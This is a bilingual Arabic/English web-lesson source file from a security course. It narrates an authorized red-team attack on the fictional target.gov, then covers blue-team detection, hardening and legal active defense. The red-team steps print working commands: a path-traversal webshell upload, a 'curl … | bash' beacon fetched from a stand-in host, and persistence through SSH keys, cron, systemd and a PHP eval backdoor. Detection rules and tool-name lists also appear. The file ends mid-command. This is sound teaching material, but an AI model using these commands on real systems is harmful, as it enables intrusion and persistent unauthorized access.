"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="full-attack-scenario">
      <L
        ar={
          <>
            <Section title="السيناريو الكامل — اختراق target.gov من الصفر للـ backdoor">
              <Analogy>
                الدرس ده مش list of commands.
                ده <b>فيلم كامل</b>.
                red team عنده تصريح بيخترق بوابة حكومية وهمية اسمها <span className="eng">target.gov</span>، من أول packet لحد الـ backdoor الأخير.
                وبعدين بنرجّع الشريط من بعدسة الـ blue team: الـ SOC شاف ايه؟ ايه الـ alerts اللي ضربت؟ ايه اللي مرّ بدون ما يحس بيه حد؟
                وأخيراً، الـ <b>Active Defense</b> — مش "hack back" — كيف نخدع الـ adversary، نلمّ TTPs، ونبني قضية attribution على القانون.
              </Analogy>
              <Callout kind="danger" title="قبل ما تكمّل">
                السيناريو ده على <span className="eng">target.gov</span> (RFC 2606، نطاق وهمي محجوز للتعليم) في تدريب حكومي معتمد.
                لو نفّذت أي خطوة منها على asset حقيقي بدون تصريح كتابي — ده مش red teaming، ده crime.
                الـ Active Defense تحديداً منطقة قانونية حساسة. ما تخرجش من شبكتك من غير أمر قضائي. CFAA الأمريكي وقوانين الـ ITIDA المصري الاتنين بياكلوا فيها.
              </Callout>
              <p className="opacity-80">
                الإطار: Cyber Kill Chain من Lockheed (Recon -&gt; Weaponize -&gt; Deliver -&gt; Exploit -&gt; Install -&gt; C2 -&gt; Actions)،
                + ATT&amp;CK mapping لكل خطوة. الـ blue team عندنا 4 نقاط محتملة يلاقطنا فيها. هدفنا نشوفها كلها قبل ما نمشي.
              </p>
            </Section>

            <Section title="الجزء الأول — الفريق الأحمر">
              <p className="opacity-80 mb-4">
                التفويض: خطاب مكتوب من الجهة، نطاق محدد (<span className="eng">*.target.gov</span>)، نافذة زمنية،
                نقطة اتصال طارئة، قائمة أنظمة محظورة (PROD-DB، SCADA). كل أمر يُسجَّل في <span className="eng">script(1)</span>
                أو في تسجيل Burp.
              </p>

              <Step n={1} title="الاستطلاع السلبي — لا تلمس الهدف">
                <p>قبل أي حزمة باتجاه الخادم، نجمع كل ما هو <b>عام</b>. المهاجم الذكي يمشي في الظل أولاً.</p>
                <Code lang="bash">{`# 1. جرد الـ subdomains من الشهادات (passive)
curl -s "https://crt.sh/?q=%25.target.gov&output=json" | jq -r '.[].name_value' | sort -u

# 2. سجلات DNS التاريخية
amass enum -passive -d target.gov -o subs.txt

# 3. ملفات مسرّبة (PDF, docx) قد تفضح أسماء مستخدمين
google-dorks: site:target.gov filetype:pdf
metagoofil -d target.gov -t pdf,docx -l 100 -o ./loot

# 4. GitHub — مفاتيح API، نسخ احتياطية
gh search code "target.gov" --json repository,path
trufflehog github --org=target-gov --only-verified

# 5. LinkedIn / Wayback — أسماء موظفين، تقنيات قديمة
linkedin2username -c "Target Gov Authority"
waybackurls target.gov | grep -E "\\.(env|bak|old|swp)$"`}</Code>
                <p className="text-sm opacity-80 mt-2">
                  ATT&CK: <span className="eng">T1589 (Gather Victim Identity)</span>،
                  <span className="eng"> T1592 (Gather Victim Host)</span>،
                  <span className="eng"> T1596 (Search Open Technical DBs)</span>.
                </p>
              </Step>

              <Step n={2} title="الاستطلاع النشط — أول حزمة تصل الهدف">
                <p>الآن نُرسل طلبات. كل حزمة تُسجَّل في WAF/EDR. نعمل ببطء و من IPs متعددة.</p>
                <Code lang="bash">{`# 1. بصمة الـ stack
whatweb -a 4 https://www.target.gov
wafw00f https://www.target.gov          # كشف WAF (Cloudflare? F5? Imperva?)
curl -sI https://www.target.gov | head  # Server, X-Powered-By

# 2. مسح خفيف (rate-limited)
nmap -sS -T2 --top-ports 1000 -Pn www.target.gov
# لاحقاً، بعد إيجاد origin مكشوف:
nmap -sV -sC -p 80,443,8080,8443,3306,5432 origin.target.gov

# 3. اكتشاف المسارات
ffuf -u https://www.target.gov/FUZZ \\
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \\
     -mc 200,301,401,403 -t 20 -p 0.3
# /admin, /api/v1, /backup.zip, /.git/HEAD ...`}</Code>
                <Callout kind="warn" title="نقطة كشف #1 — هنا الـ junior بيتقبض عليه">
                  الـ WAF بيشوف pattern الـ ffuf من 7 سواقي: User-Agent default، rate ثابت، 404 burst.
                  الـ junior بيشغّل ffuf مباشرة من VPS واحد. الـ blue team بيشوفه قبل ما القهوة تبرد.
                  الـ professional: User-Agent رياليستي، <span className="eng">--delay</span> عشوائي، rotation على residential proxies (Bright Data, Smartproxy).
                  وحتى كده، لو الـ WAF شاطر هتاكلها. السكة الأنضف: تتعلم من JS bundles وما تـ bruteforce-ش أصلاً.
                </Callout>
              </Step>

              <Step n={3} title="فحص الثغرات و الفرز">
                <p>لدينا الآن قائمة أصول. نُشغّل ماسحات مُتخصّصة و نُفلتر النتائج يدوياً.</p>
                <Code lang="bash">{`# Nuclei — قوالب CVE معروفة (3900+ template)
nuclei -u https://portal.target.gov -severity high,critical -rl 30

# Nikto — مشاكل على مستوى الخادم
nikto -h https://portal.target.gov -Tuning x6

# اختبار يدوي للـ params التي وجدها arjun
arjun -u https://portal.target.gov/api/v2/users
# ?id=, ?lang=, ?file=, ?redirect= ...

# فحص JS bundles لاكتشاف endpoints مخفية
linkfinder -i 'https://portal.target.gov/static/*.js' -o cli`}</Code>
                <Terminal lines={[
                  { p: "$ nuclei -u https://portal.target.gov -severity critical" },
                  { o: "[CVE-2023-XXXXX] [http] [critical] https://portal.target.gov/api/upload" },
                  { o: "[apache-path-traversal] [http] [high] https://portal.target.gov/static/../" },
                  { o: "[exposed-git] [http] [high] https://portal.target.gov/.git/HEAD" },
                ]} />
                <p className="text-sm opacity-80 mt-2">
                  ATT&CK: <span className="eng">T1595.002 (Vulnerability Scanning)</span>.
                  ثلاثة خيوط محتملة — نختار الأهدأ صوتاً: <b>.git المكشوف</b>.
                </p>
              </Step>

              <Step n={4} title="الاستغلال — من ثغرة إلى shell">
                <p>الـ <span className="eng">.git/</span> المكشوف يُعطينا الكود المصدري. هناك نجد الجوهرة الحقيقية.</p>
                <Code lang="bash">{`# 1. سحب المستودع كاملاً
git-dumper https://portal.target.gov/.git/ ./loot/source

# 2. مراجعة الكود — مفاتيح، endpoints، منطق ضعيف
cd loot/source
trufflehog filesystem . --only-verified
grep -rE "API_KEY|SECRET|PASSWORD|TOKEN" --include="*.env*" --include="*.config*"

# وجدنا في .env.production:
# DB_PASS=Sup3r-Secret-2024
# ADMIN_TOKEN=eyJhbGc...
# AWS_ACCESS_KEY_ID=AKIA...

# 3. مراجعة المسار /api/upload الذي ظهر في nuclei
# الكود يستقبل filename دون تعقيم → path traversal → write webshell
curl -X POST https://portal.target.gov/api/upload \\
  -H "Authorization: Bearer eyJhbGc..." \\
  -F "file=@shell.php;filename=../../public/uploads/x.php"

# 4. تأكيد التنفيذ
curl "https://portal.target.gov/uploads/x.php?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)`}</Code>
                <Callout kind="warn" title="نقطة كشف #2 — رفع .php في uploads = إعلان حضور">
                  رفع <span className="eng">.php</span> في مجلد uploads = signature معروف من 15 سنة. أي EDR أو WAF محترم بيلاقطه.
                  السكة الشاطرة: webshell بـ <span className="eng">.phtml</span> لو الـ Apache config بيشغّلها، أو حقن في ملف موجود (less filesystem changes)،
                  أو الأصح: <b>memory-only payload</b> زي Behinder أو AntSword بـ encrypted comms. ما يفضلش على الديسك حاجة.
                </Callout>
              </Step>

              <Step n={5} title="ترسيخ الموطئ — من webshell إلى C2 مستقر">
                <p>الـ webshell هشّ. نحتاج اتصالاً ثنائياً مُشفّراً مع server خارجي = C2.</p>
                <Code lang="bash">{`# 1. على الـ webshell نُنزّل beacon
curl https://portal.target.gov/uploads/x.php?cmd=$(echo -n \\
  "curl -sk https://cdn-redteam.example/u | bash" | base64)

# 2. الـ payload المُحمّل (Sliver/Mythic/Cobalt Strike مُكوّنة بـ HTTPS jitter)
# /tmp/.X11-cache (يبدو ملفاً نظامياً)
chmod +x /tmp/.X11-cache && /tmp/.X11-cache &

# 3. على C2 (Sliver مثال)
> sessions
ID  Name      Transport  RemoteAddress      Hostname
1   sweetgum  https      10.20.30.5:54321   web01.target.gov

# 4. حركة جانبية — تعداد ثم استخراج credentials
> use 1
> ps              # هل هناك أنتي فيرس؟
> ls /home        # حسابات
> shell
$ sudo -l         # هل www-data له sudo بدون كلمة سر على شيء؟
$ cat /etc/passwd
$ find / -perm -4000 2>/dev/null   # SUID
$ ss -tnlp        # ما الذي يستمع داخلياً؟ — DB؟ Redis؟`}</Code>
                <p className="text-sm opacity-80">
                  ATT&CK: <span className="eng">T1505.003 (Web Shell)</span>،
                  <span className="eng"> T1071.001 (App Layer Protocol — HTTPS C2)</span>،
                  <span className="eng"> T1059.004 (Unix Shell)</span>.
                </p>
              </Step>

              <Step n={6} title="الباب الخلفي — البقاء عبر إعادة التشغيل">
                <p>هدفنا أن نعود حتى لو أُغلق webshell. أربع طبقات بقاء، مرتبة من الأهدأ إلى الأعلى صوتاً:</p>
                <TwoCol>
                  <Card title="1. SSH key في حساب خدمة" color="red">
                    <Code lang="bash">{`# نضيف مفتاحنا إلى authorized_keys لمستخدم نادر الاستخدام
echo "ssh-ed25519 AAAA..." >> /home/backup/.ssh/authorized_keys
# تعديل sshd_config: AllowUsers backup`}</Code>
                  </Card>
                  <Card title="2. systemd timer مُموّه" color="red">
                    <Code lang="bash">{`# /etc/systemd/system/apt-cache-clean.timer
# يبدو كصيانة، يُشغّل beacon كل 4 ساعات
[Timer]
OnBootSec=15min
OnUnitActiveSec=4h`}</Code>
                  </Card>
                  <Card title="3. Cron job في /etc/cron.d" color="red">
                    <Code lang="bash">{`# يستخدم اسماً نظامياً
echo "*/30 * * * * root /usr/lib/.cache/sync" \\
  > /etc/cron.d/logrotate-sync`}</Code>
                  </Card>
                  <Card title="4. Web backdoor ثاني" color="red">
                    <Code lang="bash">{`# داخل ملف PHP موجود — سطر واحد
# يُفعَّل فقط بـ header خاص
if(isset($_SERVER['HTTP_X_FWD_VER']) &&
   $_SERVER['HTTP_X_FWD_VER']==='9a3f') eval(...);`}</Code>
                  </Card>
                </TwoCol>
                <p className="text-sm opacity-80 mt-3">
                  ATT&CK: <span className="eng">T1098.004 (SSH Auth Keys)</span>،
                  <span className="eng"> T1053.006 (systemd Timers)</span>،
                  <span className="eng"> T1505.003 (Web Shell)</span>.
                </p>
              </Step>

              <Step n={7} title="الأهداف — لماذا نحن هنا">
                <p>الباب الخلفي ليس الهدف. الهدف هو <b>البيانات</b> أو <b>التأثير</b>. حسب التفويض:</p>
                <ul className="list-disc list-inside opacity-80 space-y-1">
                  <li>تعداد قاعدة البيانات → سحب hash كلمات المرور (لإثبات الوصول، لا للنشر).</li>
                  <li>الوصول إلى مفتاح AWS الذي وجدناه → تعداد S3 buckets، lambda functions.</li>
                  <li>التحرك جانبياً نحو AD (إذا كان داخل النطاق) — Kerberoasting، AS-REP roasting.</li>
                  <li>التوثيق: لقطات شاشة، hashes (مُقصّة)، مسارات ATT&CK، خط زمني دقيق.</li>
                </ul>
              </Step>

              <Callout kind="danger" title="حدود حمراء — مش بنتفاوض عليها">
                اوعى تسرّب data حقيقية برّه الـ engagement.
                اوعى تشغّل ransomware ولا wiper تحت أي ظرف.
                اوعى تلمس <span className="eng">SCADA/PROD-DB</span> اللي في الـ exclusion list.
                اوعى تسيب backdoor بعد ما الـ window يقفل — كل واحدة بتتنضّف، وبتسلّم Cleanup Verification document للعميل، وبيوقّع عليها.
                ده الفرق بين red teamer محترم وبين مجرم معاه permission slip.
              </Callout>
            </Section>

            <Section title="الجزء الثاني — الفريق الأزرق: ماذا رأينا؟">
              <Analogy>
                نُعيد الشريط من جانب SOC. كل خطوة من الفريق الأحمر تترك <b>أثراً</b>: log entry، حزمة شاذة،
                طفل عملية غير معتاد، اتصال صادر إلى ASN غريب. السؤال ليس "هل تركت أثراً؟" بل
                <b> "هل هناك من يُراقب الأثر الصحيح؟"</b>
              </Analogy>

              <Step n={1} title="ما كان يجب أن يُلتقَط في الاستطلاع">
                <Code lang="text">{`المصدر: WAF / Reverse Proxy logs

[10:14:02] 198.51.100.7 GET /admin       → 403  UA="Mozilla/5.0 ffuf"
[10:14:02] 198.51.100.7 GET /backup.zip  → 404
[10:14:02] 198.51.100.7 GET /.git/HEAD   → 200  ← انذار!
[10:14:03] 198.51.100.7 GET /api/v1      → 401
... (1200 طلب في 90 ثانية)

قواعد الكشف:
1. Splunk/Sigma: > 100 طلب 4xx/5xx من نفس IP خلال 60s
2. User-Agent يحوي "ffuf|sqlmap|nuclei|nikto|gobuster"
3. وصول ناجح إلى /.git/* أو /.env* أو /backup*
4. تنبيه crt.sh monitoring — شهادة جديدة لنطاقنا تظهر في log`}</Code>
              </Step>

              <Step n={2} title="ما كان يجب أن يُلتقَط في الاستغلال">
                <p>رفع <span className="eng">.php</span> في مجلد uploads = توقيع كلاسيكي.</p>
                <Code lang="text">{`المصدر: File Integrity Monitoring (Wazuh / auditd)

type=PATH msg=audit(...): name="/var/www/public/uploads/x.php"
  nametype=CREATE  uid=33 (www-data)

قاعدة Sigma:
detection:
  selection:
    Image: '*php*'
    TargetFilename|endswith: ['.php', '.phtml', '.jsp']
    TargetFilename|contains: '/uploads/'
  condition: selection

+ EDR rule: عملية www-data تُنفّذ /bin/sh أو curl خارج localhost`}</Code>
              </Step>

              <Step n={3} title="ما كان يجب أن يُلتقَط في الـ C2">
                <p>الـ beacon يتصل خارجياً بشكل دوري. هذا أوضح إشارة في كل السيناريو.</p>
                <Code lang="text">{`المصدر: Zeek / Suricata + DNS logs

# beaconing detection
RITA: تكرار اتصالات إلى نفس IP بفاصل ثابت (jitter منخفض)
  → score > 0.8 = beacon محتمل

# JA3/JA4 fingerprint
TLS handshake من /tmp/.X11-cache ≠ توقيع متصفّح أو curl معتاد
  → JA3 hash = blacklisted (Sliver default)

# DNS
استعلام عن cdn-redteam.example من خادم production
  → ASN غير معروف، عُمر النطاق < 30 يوم = إنذار`}</Code>
                <Callout kind="good" title="اكتبها على الحيطة">
                  السيرفر في production مش لازم يبدأ outbound connection <b>غير</b> لـ allowlist واضحة (apt mirrors، cloud APIs، NTP، DNS).
                  أي connection تانية = incident لحد ما تثبت العكس.
                  ده اللي اسمه egress filtering. ومحدش بيعمله. ومحدش بيلاقط الـ C2 بسببه. وبعدين بيستغربوا.
                </Callout>
              </Step>

              <Step n={4} title="ما كان يجب أن يُلتقَط في الباب الخلفي">
                <Code lang="text">{`auditd: تعديل /home/*/.ssh/authorized_keys
  → إنذار حرج (لا يحدث في العمليات الطبيعية)

systemd: وحدة جديدة في /etc/systemd/system/*.timer
  → diff مع baseline الـ FIM

cron: ملف جديد في /etc/cron.d/
  → نفس الشيء

osquery query تشغّل كل 15 دقيقة:
SELECT * FROM crontab WHERE path NOT IN (<baseline>);
SELECT * FROM authorized_keys WHERE uid != <expected>;`}</Code>
              </Step>
            </Section>

            <Section title="الجزء الثالث — الحماية: كيف نُغلق هذه السلسلة">
              <Callout kind="good" title="Defense in Depth — مفيش طبقة واحدة بتكفي">
                مفيش silver bullet. كل طبقة هنا ممكن تتكسر لوحدها. بس كسر الخمسة مع بعض = مكلف جداً للـ adversary.
                ده الـ economics بتاع الـ defense. مش "أمنع الكل"، ده "أخلّي الاختراق غالي بحيث ما يستحقش".
              </Callout>

              <TwoCol>
                <Card title="طبقة 1 — تقليل الأبواب اللي قدامه" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>مراجعة دورية لـ <span className="eng">crt.sh</span> — لا شهادات لنطاقات غير معتمدة.</li>
                    <li>حظر الوصول إلى <span className="eng">.git/, .env, .svn/</span> على مستوى reverse proxy.</li>
                    <li>عدم نشر مستودعات تطوير على origin مكشوف.</li>
                    <li>أسرار في <span className="eng">Vault/AWS Secrets Manager</span>، لا في <span className="eng">.env</span>.</li>
                  </ul>
                </Card>
                <Card title="طبقة 2 — WAF و rate limiting" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>قواعد ModSecurity CRS أو AWS WAF managed rules.</li>
                    <li>rate limit على endpoints حسّاسة (login، upload، API).</li>
                    <li>تحدّي JS / CAPTCHA على نمط فحص آلي.</li>
                    <li>حظر User-Agents معروفة لأدوات pentest في production.</li>
                  </ul>
                </Card>
                <Card title="طبقة 3 — تصلّب التطبيق" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>تعقيم filename + قائمة بيضاء للامتدادات.</li>
                    <li>مجلد uploads خارج <span className="eng">DocumentRoot</span> — لا ينفّذ كـ PHP.</li>
                    <li>مبدأ أقل صلاحية: حساب التطبيق لا يكتب خارج مجلده.</li>
                    <li>SAST/DAST في الـ CI — لا ندخل production بثغرة معروفة.</li>
                  </ul>
                </Card>
                <Card title="طبقة 4 — تجزئة الشبكة" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>خوادم web لا تتصل بـ DB إلا عبر منفذ واحد محدد.</li>
                    <li>egress firewall — قائمة بيضاء صارمة للـ DNS و IPs.</li>
                    <li>VLANs منفصلة: web ↔ app ↔ DB ↔ admin.</li>
                    <li>Zero Trust: كل اتصال داخلي يُصادَق و يُسجَّل.</li>
                  </ul>
                </Card>
                <Card title="طبقة 5 — كشف و استجابة" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>EDR على كل خادم (CrowdStrike/SentinelOne/Wazuh).</li>
                    <li>SIEM يجمع: web logs + auditd + Zeek + DNS.</li>
                    <li>قواعد Sigma للـ TTPs أعلاه — مُختبرة بـ <span className="eng">atomic-red-team</span>.</li>
                    <li>SOAR playbook: عند تنبيه webshell → عزل تلقائي للحاوية.</li>
                  </ul>
                </Card>
                <Card title="طبقة 6 — استعداد بشري" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Tabletop شهري — يحاكي بالضبط هذا السيناريو.</li>
                    <li>IR runbook مكتوب، مجرَّب، و معروف لكل العاملين.</li>
                    <li>Threat hunting أسبوعي — لا ننتظر التنبيه.</li>
                    <li>Purple team: الأزرق و الأحمر يجلسان معاً.</li>
                  </ul>
                </Card>
              </TwoCol>
            </Section>

            <Section title="الجزء الرابع — الرد العكسي (Active Defense)">
              <Callout kind="danger" title="خط أحمر قانوني">
                "Hack back" يعني تخترق اللي مخترقك = <b>مش قانوني</b> في 95% من الـ jurisdictions، بما فيهم CFAA الأمريكي.
                الـ Active Defense المسموح بيقع في 3 فئات بس:
                (1) جوّه شبكتك — honeytokens, sinkholing, deception.
                (2) خداع — تطعمه بيانات وهمية مع canary tokens.
                (3) تعاون قانوني مع جهات إنفاذ — CERTs, FBI, Interpol.
                الفرق دقيق ومهم. لو ما تأكدتش، اسأل محامي مختص قبل ما تنفّذ.
              </Callout>

              <TwoCol>
                <Card title="1. Honeytokens & Honeypots" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>وثيقة <span className="eng">passwords.xlsx</span> وهمية في share — أي وصول لها = حادث مؤكد.</li>
                    <li>حساب AD وهمي بصلاحيات مغرية — أي محاولة Kerberoast = إنذار.</li>
                    <li>مفتاح AWS canary (Thinkst Canarytokens) — يُطلق إنذاراً عند أول استخدام.</li>
                    <li>خادم T-Pot في DMZ — يجمع TTPs و IPs لشبكة المهاجم.</li>
                  </ul>
                </Card>
                <Card title="2. خداع المهاجم في الشبكة" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>عند كشف beacon: لا تقطع فوراً. راقب لجمع TTPs.</li>
                    <li>أعد توجيه C2 traffic إلى sinkhole — يستمر المهاجم بظنه يُسيطر.</li>
                    <li>أطعمه بيانات وهمية مُحبكة — وثائق وهمية موسومة بـ canarytoken.</li>
                    <li>هذا يكشف الـ infrastructure الكاملة للمهاجم قبل الطرد النهائي.</li>
                  </ul>
                </Card>
                <Card title="3. الإسناد (Attribution) القانوني" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>اجمع: IPs، JA3، أسماء أدوات، أسلوب التشغيل (TTPs)، أوقات النشاط (timezone).</li>
                    <li>قارن مع تقارير CTI (Mandiant, CrowdStrike, Talos) — هل النمط معروف؟</li>
                    <li>سلسلة الحراسة (chain of custody) للأدلة — صور disk، memory dumps، PCAPs.</li>
                    <li>سلّم الحزمة لـ CERT الوطنية / إنفاذ القانون. لا تنشر علنياً قبل إذنهم.</li>
                  </ul>
                </Card>
                <Card title="4. تعاون مع مزوّدي البنية التحتية" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>إبلاغ ASN/Hosting الذي يستضيف C2 → takedown.</li>
                    <li>إبلاغ مُسجّل النطاق → تعليق الدومين.</li>
                    <li>مشاركة IoCs عبر MISP / ISAC القطاعي.</li>
                    <li>طلب RPZ من مزوّد DNS لحظر النطاق على نطاق وطني.</li>
                  </ul>
                </Card>
              </TwoCol>

              <Callout kind="good" title="قصة حقيقية — إزاي اتكشفت SolarWinds؟">
                Mandiant (FireEye وقتها) ما اخترقوش الـ adversary. لاقوا beacon غريب على شبكتهم هم.
                لمّوه. تتبّعوه. لقوه بيخرج من DLL في SolarWinds Orion update. خلاص — السكة وضحت.
                نشروا IoCs عبر القنوات الرسمية. الـ industry كله تحرّك في 24 ساعة.
                ده الـ Active Defense الفعّال: detect -&gt; contain -&gt; attribute -&gt; share. مفيش حركة hack-back. وكان أكتر اختراق effective في تاريخ الـ industry response.
              </Callout>
            </Section>

            <Section title="خلاصة — الجدول الكامل">
              <Code lang="text">{`المرحلة         الفعل (أحمر)              الأثر (أزرق)              الحماية
────────────────────────────────────────────────────────────────────────
Recon           crt.sh, github dorks       —                       حذف الأسرار من Git
Scanning        ffuf, nuclei               WAF: 4xx burst          rate limit + IP rep
Discovery       /.git/HEAD = 200           access log              حظر الملفات المخفية
Initial Access  upload .php عبر traversal  FIM: ملف جديد           sanitize + sandbox
C2              HTTPS beacon               Zeek: beaconing JA3     egress allowlist
Persistence    systemd timer + SSH key    auditd: cron/ssh diff   FIM + osquery
Actions         سحب hashes                 DB egress شاذ           DLP + canary creds

Active Defense: honeytokens → اكتشاف فوري | sinkhole → جمع TTPs | CERT → takedown`}</Code>
              <p className="opacity-80 mt-3">
                الكلام اللي بيتقال: "المهاجم محتاج ينجح مرة، المدافع محتاج ينجح كل مرة". صحيح بس ناقص.
                الـ asymmetry المعاكسة: <b>المهاجم محتاج يخفي كل أثر، المدافع محتاج alert واحد صح</b>.
                واللي بيخسر هو اللي بيـ ignore الـ alert الواحد ده.
              </p>
            </Section>

            <Section title="الخلاصة الناشفة">
              <p>
                الفيلم ده مش flex. ده تذكرة. الـ red team بيشتغل بـ playbook معروف. الـ blue team عنده 4-5 نقط ممكن يلاقطه فيها.
              </p>
              <p>
                واللي بيحصل فعلياً — وأنا شفته بعيني — إن أغلب الـ alerts في الـ SOC بتروح في sleep لأن الـ analyst تعبان أو الـ rule noisy.
                الـ adversary بيعدّي مش لأنه شاطر. بيعدّي لأن الـ defender بيتفرّج مش بيراقب.
              </p>
              <p>الفرق بين اتنين: hunting culture، egress filtering، ETW + Sysmon + identity logs مع بعض، و SOAR بيشتغل automatically. الباقي تفاصيل.</p>
            </Section>

            <Section title="مراجع و قراءة إضافية">
              <ul className="list-disc list-inside opacity-80 space-y-1 text-sm">
                <li>Lockheed Martin — Cyber Kill Chain whitepaper.</li>
                <li>MITRE ATT&CK Enterprise Matrix.</li>
                <li>Active Defense Harbinger Distribution (ADHD) — Black Hills InfoSec.</li>
                <li>SANS FOR508 — Advanced IR & Threat Hunting.</li>
                <li>Mandiant M-Trends Report (annual).</li>
              </ul>
            </Section>
          </>
        }
        en={
          <>
            <Section title="The scenario — full attack on target.gov">
              <Analogy>
                This isn't a command list. It's <b>one continuous story</b>: an authorized red team breaches a
                fictional government portal called <span className="eng">target.gov</span> from zero to backdoor —
                then we replay the same film through the blue team's lens: what did the SOC see? Which alerts
                fired? How is the chain broken? And how is <b>active defense / counter-attack</b> performed
                legally — attacker identification, deception, and legal attribution.
              </Analogy>
              <Callout kind="danger" title="Legal warning">
                The scenario runs against a fictional asset (<span className="eng">target.gov</span>, RFC 2606)
                inside an authorized government training. Running any of these steps against a real asset without
                explicit written authorization is a criminal offense. Active defense in particular sits in a
                sensitive legal area — never leave your own network without a court order or the legal framework
                of your jurisdiction (CFAA, equivalent national laws).
              </Callout>
              <p className="opacity-80">
                Framework: Lockheed's Cyber Kill Chain (Recon → Weaponize → Deliver → Exploit → Install → C2 →
                Actions on Objectives), with MITRE ATT&CK mappings on every step. The blue team has at least
                four chances to catch us — our goal is to understand all of them.
              </p>
            </Section>

            <Section title="Part one — the red team">
              <p className="opacity-80 mb-4">
                Authorization: written letter from the agency, defined scope (<span className="eng">*.target.gov</span>),
                a time window, an emergency contact, and a list of forbidden systems (PROD-DB, SCADA). Every
                command is recorded via <span className="eng">script(1)</span> or full Burp logging.
              </p>

              <Step n={1} title="Passive recon — don't touch the target">
                <p>Before a single packet hits the server, gather everything <b>public</b>. The smart attacker walks the shadows first.</p>
                <Code lang="bash">{`# 1. Subdomain inventory from CT logs (passive)
curl -s "https://crt.sh/?q=%25.target.gov&output=json" | jq -r '.[].name_value' | sort -u

# 2. Historical DNS
amass enum -passive -d target.gov -o subs.txt

# 3. Leaked documents (PDF, docx) often expose usernames
google-dorks: site:target.gov filetype:pdf
metagoofil -d target.gov -t pdf,docx -l 100 -o ./loot

# 4. GitHub — API keys, backups
gh search code "target.gov" --json repository,path
trufflehog github --org=target-gov --only-verified

# 5. LinkedIn / Wayback — employees, legacy tech
linkedin2username -c "Target Gov Authority"
waybackurls target.gov | grep -E "\\.(env|bak|old|swp)$"`}</Code>
                <p className="text-sm opacity-80 mt-2">
                  ATT&CK: <span className="eng">T1589 (Gather Victim Identity)</span>,
                  <span className="eng"> T1592 (Gather Victim Host)</span>,
                  <span className="eng"> T1596 (Search Open Technical DBs)</span>.
                </p>
              </Step>

              <Step n={2} title="Active recon — first packet to the target">
                <p>Now we send requests. Every packet is logged in WAF/EDR. We move slowly and from multiple IPs.</p>
                <Code lang="bash">{`# 1. Stack fingerprint
whatweb -a 4 https://www.target.gov
wafw00f https://www.target.gov          # detect WAF
curl -sI https://www.target.gov | head  # Server, X-Powered-By

# 2. Light scan (rate-limited)
nmap -sS -T2 --top-ports 1000 -Pn www.target.gov
# Later, after finding exposed origin:
nmap -sV -sC -p 80,443,8080,8443,3306,5432 origin.target.gov

# 3. Path discovery
ffuf -u https://www.target.gov/FUZZ \\
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \\
     -mc 200,301,401,403 -t 20 -p 0.3
# /admin, /api/v1, /backup.zip, /.git/HEAD ...`}</Code>
                <Callout kind="warn" title="Detection point #1">
                  The WAF sees the <span className="eng">ffuf</span> pattern instantly (User-Agent, rate, 404 spike).
                  A pro: rotates User-Agent, uses <span className="eng">--delay</span>, rotates IPs through
                  <span className="eng"> proxychains + residential proxies</span>.
                </Callout>
              </Step>

              <Step n={3} title="Vulnerability scan and triage">
                <p>We have an asset list. Run targeted scanners and triage manually.</p>
                <Code lang="bash">{`# Nuclei — known CVE templates (3900+)
nuclei -u https://portal.target.gov -severity high,critical -rl 30

# Nikto — server-level issues
nikto -h https://portal.target.gov -Tuning x6

# Manual probe of params arjun discovered
arjun -u https://portal.target.gov/api/v2/users
# ?id=, ?lang=, ?file=, ?redirect= ...

# JS bundles for hidden endpoints
linkfinder -i 'https://portal.target.gov/static/*.js' -o cli`}</Code>
                <Terminal lines={[
                  { p: "$ nuclei -u https://portal.target.gov -severity critical" },
                  { o: "[CVE-2023-XXXXX] [http] [critical] https://portal.target.gov/api/upload" },
                  { o: "[apache-path-traversal] [http] [high] https://portal.target.gov/static/../" },
                  { o: "[exposed-git] [http] [high] https://portal.target.gov/.git/HEAD" },
                ]} />
                <p className="text-sm opacity-80 mt-2">
                  ATT&CK: <span className="eng">T1595.002 (Vulnerability Scanning)</span>.
                  Three viable threads — pick the quietest: <b>exposed .git</b>.
                </p>
              </Step>

              <Step n={4} title="Exploitation — from vuln to shell">
                <p>The exposed <span className="eng">.git/</span> hands us the source code. The real jewel lives there.</p>
                <Code lang="bash">{`# 1. Dump the repo
git-dumper https://portal.target.gov/.git/ ./loot/source

# 2. Review code — keys, endpoints, weak logic
cd loot/source
trufflehog filesystem . --only-verified
grep -rE "API_KEY|SECRET|PASSWORD|TOKEN" --include="*.env*" --include="*.config*"

# Found in .env.production:
# DB_PASS=Sup3r-Secret-2024
# ADMIN_TOKEN=eyJhbGc...
# AWS_ACCESS_KEY_ID=AKIA...

# 3. Review the /api/upload route nuclei flagged
# Code accepts filename without sanitization → path traversal → write webshell
curl -X POST https://portal.target.gov/api/upload \\
  -H "Authorization: Bearer eyJhbGc..." \\
  -F "file=@shell.php;filename=../../public/uploads/x.php"

# 4. Confirm execution
curl "https://portal.target.gov/uploads/x.php?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)`}</Code>
                <Callout kind="warn" title="Detection point #2">
                  Dropping a <span className="eng">.php</span> in an uploads directory is a textbook EDR/WAF
                  signature. A pro: uses <span className="eng">.phtml</span>, injects into an existing file, or
                  uses a <b>memory-only payload</b> (Behinder, AntSword obfuscated).
                </Callout>
              </Step>

              <Step n={5} title="Foothold — from webshell to stable C2">
                <p>The webshell is fragile. We need an encrypted bidirectional channel to an external server: C2.</p>
                <Code lang="bash">{`# 1. Pull beacon via the webshell
curl https://portal.target.gov/uploads/x.php?cmd=$(echo -n \\
